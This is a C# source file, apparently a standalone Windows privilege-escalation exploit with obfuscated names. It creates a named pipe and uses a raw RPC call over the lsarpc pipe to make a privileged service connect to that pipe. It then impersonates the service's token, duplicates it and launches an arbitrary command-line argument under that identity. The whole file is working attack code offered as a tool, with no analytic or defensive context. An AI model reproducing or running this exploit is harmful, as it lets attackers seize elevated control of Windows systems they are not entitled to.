using System;
using System.Runtime.InteropServices;
using System.Threading;

public class X7
{
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars;
        public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2;
        public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    static extern IntPtr CreateNamedPipe(string name, uint openMode, uint pipeMode, uint maxInstances, uint outBuf, uint inBuf, uint timeout, IntPtr sa);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool ConnectNamedPipe(IntPtr h, IntPtr ov);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool ImpersonateNamedPipeClient(IntPtr h);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool OpenThreadToken(IntPtr t, uint access, bool openAsSelf, out IntPtr token);
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool DuplicateTokenEx(IntPtr existing, uint access, IntPtr sa, int impLevel, int tokenType, out IntPtr newToken);
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    static extern bool CreateProcessAsUser(IntPtr token, string app, string cmd, IntPtr pa, IntPtr ta, bool inherit,
        uint flags, IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);

    [StructLayout(LayoutKind.Sequential)]
    struct CFO { public short a; public short b; }
    [StructLayout(LayoutKind.Sequential)]
    struct RV { public ushort M; public ushort m; public RV(ushort x, ushort y){ M=x; m=y; } }
    [StructLayout(LayoutKind.Sequential)]
    struct SYID { public Guid G; public RV V; }
    [StructLayout(LayoutKind.Sequential)]
    struct RCI
    {
        public uint Len;
        public SYID Iid;
        public SYID Tr;
        public IntPtr Dt;
        public uint EpCount;
        public IntPtr Ep;
        public IntPtr Rs;
        public IntPtr Ip;
        public uint Fg;
        public static Guid NDR = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60);
        public RCI(Guid iid, ushort mj, ushort mn)
        {
            Len = (uint)Marshal.SizeOf(typeof(RCI));
            Iid = new SYID(); Iid.G = iid; Iid.V = new RV(mj, mn);
            Tr = new SYID(); Tr.G = NDR; Tr.V = new RV(2, 0);
            Dt = IntPtr.Zero; EpCount = 0; Ep = IntPtr.Zero; Rs = IntPtr.Zero; Ip = IntPtr.Zero; Fg = 0;
        }
    }
    [StructLayout(LayoutKind.Sequential)]
    struct SD
    {
        public IntPtr I; public IntPtr Al; public IntPtr Fr; public IntPtr Ab;
        public IntPtr Ru; public IntPtr Gb; public IntPtr Ev; public IntPtr Xq;
        public IntPtr Ft; public int Cb; public uint V; public IntPtr Mf; public int Mv;
        public IntPtr Cf; public IntPtr Uq; public IntPtr Nt; public IntPtr Mfl;
        public IntPtr Cs; public IntPtr Ps; public IntPtr Pe;
        public SD(IntPtr ft, IntPtr inf, IntPtr al, IntPtr fr)
        {
            I = inf; Al = al; Fr = fr; Ab = IntPtr.Zero; Ru = IntPtr.Zero; Gb = IntPtr.Zero;
            Ev = IntPtr.Zero; Xq = IntPtr.Zero; Ft = ft; Cb = 1; V = 0x50002u; Mf = IntPtr.Zero;
            Mv = 0x801026e; Cf = IntPtr.Zero; Uq = IntPtr.Zero; Nt = IntPtr.Zero; Mfl = new IntPtr(0x00000001);
            Cs = IntPtr.Zero; Ps = IntPtr.Zero; Pe = IntPtr.Zero;
        }
    }

    [DllImport("Rpcrt4.dll", EntryPoint="RpcStringBindingComposeW", CallingConvention=CallingConvention.StdCall, CharSet=CharSet.Unicode)]
    static extern int R1(string a, string b, string c, string d, string e, out IntPtr f);
    [DllImport("Rpcrt4.dll", EntryPoint="RpcBindingFromStringBindingW", CallingConvention=CallingConvention.StdCall, CharSet=CharSet.Unicode)]
    static extern int R2(string s, out IntPtr b);
    [DllImport("Rpcrt4.dll", EntryPoint="RpcBindingSetAuthInfoW", CallingConvention=CallingConvention.StdCall, CharSet=CharSet.Unicode)]
    static extern int R3(IntPtr b, string p, uint l, uint s, IntPtr i, uint z);
    [DllImport("Rpcrt4.dll", EntryPoint="RpcBindingSetOption", CallingConvention=CallingConvention.StdCall)]
    static extern int R4(IntPtr b, uint o, IntPtr v);
    [DllImport("Rpcrt4.dll", EntryPoint="NdrClientCall2", CallingConvention=CallingConvention.Cdecl, CharSet=CharSet.Unicode)]
    static extern IntPtr NC(IntPtr stub, IntPtr fmt, IntPtr b, string fn);

    delegate IntPtr da(int size);
    delegate void df(IntPtr mem);
    static IntPtr Am(int s) { return Marshal.AllocHGlobal(s); }
    static void Fm(IntPtr m) { Marshal.FreeHGlobal(m); }

    static byte[] PF = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x18, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x0a, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00 };
    static byte[] TF = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };

    static string pp;
    static string tg;

    static void Srv()
    {
        IntPtr h = CreateNamedPipe(pp, 3u, 0u, 10u, 4096u, 4096u, 0u, IntPtr.Zero);
        if (h == new IntPtr(-1)) { Console.WriteLine("p-fail " + Marshal.GetLastWin32Error()); return; }
        ConnectNamedPipe(h, IntPtr.Zero);
        Console.WriteLine("conn");
        if (!ImpersonateNamedPipeClient(h)) { Console.WriteLine("i-fail " + Marshal.GetLastWin32Error()); return; }
        IntPtr t1;
        if (!OpenThreadToken(new IntPtr(-2), 0x000F01FF, false, out t1)) { Console.WriteLine("o-fail " + Marshal.GetLastWin32Error()); return; }
        IntPtr t2;
        if (!DuplicateTokenEx(t1, 0x02000000, IntPtr.Zero, 2, 1, out t2)) { Console.WriteLine("d-fail " + Marshal.GetLastWin32Error()); return; }
        Console.WriteLine("imp");
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        si.lpDesktop = "winsta0\\default";
        PROCESS_INFORMATION pi;
        bool ok = CreateProcessAsUser(t2, null, tg, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref si, out pi);
        Console.WriteLine("spawn=" + ok + " err=" + Marshal.GetLastWin32Error() + " pid=" + pi.dwProcessId);
        CloseHandle(h);
    }

    static void Trig(string g)
    {
        Guid iid = new Guid("c681d488-d850-11d0-8c52-00c04fd90f7e");
        IntPtr pf = Marshal.UnsafeAddrOfPinnedArrayElement(PF, 2);
        GCHandle hT = GCHandle.Alloc(TF, GCHandleType.Pinned);
        RCI ci = new RCI(iid, 1, 0);
        GCHandle hC = GCHandle.Alloc(ci, GCHandleType.Pinned);
        CFO co = new CFO(); co.a = -1; co.b = -1;
        GCHandle hO = GCHandle.Alloc(co, GCHandleType.Pinned);
        SD s = new SD(hT.AddrOfPinnedObject(), hC.AddrOfPinnedObject(), Marshal.GetFunctionPointerForDelegate((da)Am), Marshal.GetFunctionPointerForDelegate((df)Fm));
        GCHandle hS = GCHandle.Alloc(s, GCHandleType.Pinned);
        IntPtr bs = IntPtr.Zero, bd = IntPtr.Zero;
        int s1 = R1(iid.ToString(), "ncacn_np", "localhost", "\\pipe\\lsarpc", null, out bs);
        int s2 = R2(Marshal.PtrToStringUni(bs), out bd);
        int s3 = R3(bd, "localhost", 6, 9, IntPtr.Zero, 16);
        int s4 = R4(bd, 12, new IntPtr(5000));
        Console.WriteLine("st " + s1 + "/" + s2 + "/" + s3 + "/" + s4 + " bd=" + bd);
        string fn = "\\\\localhost/PIPE/" + g + "/\\" + g + "\\" + g;
        Console.WriteLine("go");
        try { NC(hS.AddrOfPinnedObject(), pf, bd, fn); }
        catch (Exception ex) { Console.WriteLine("t-err " + ex.GetType().Name + " code=" + Marshal.GetExceptionCode()); }
        hS.Free(); hO.Free(); hC.Free(); hT.Free();
    }

    public static void Main(string[] args)
    {
        if (args.Length < 1) { Console.WriteLine("usage: x7 <cmd>"); return; }
        tg = args[0];
        string g = Guid.NewGuid().ToString("d");
        pp = "\\\\.\\pipe\\" + g + "\\pipe\\w";
        Console.WriteLine("pipe=" + pp);
        Thread t = new Thread(Srv);
        t.IsBackground = true;
        t.Start();
        Thread.Sleep(800);
        Trig(g);
        Thread.Sleep(4000);
        Console.WriteLine("done");
    }
}
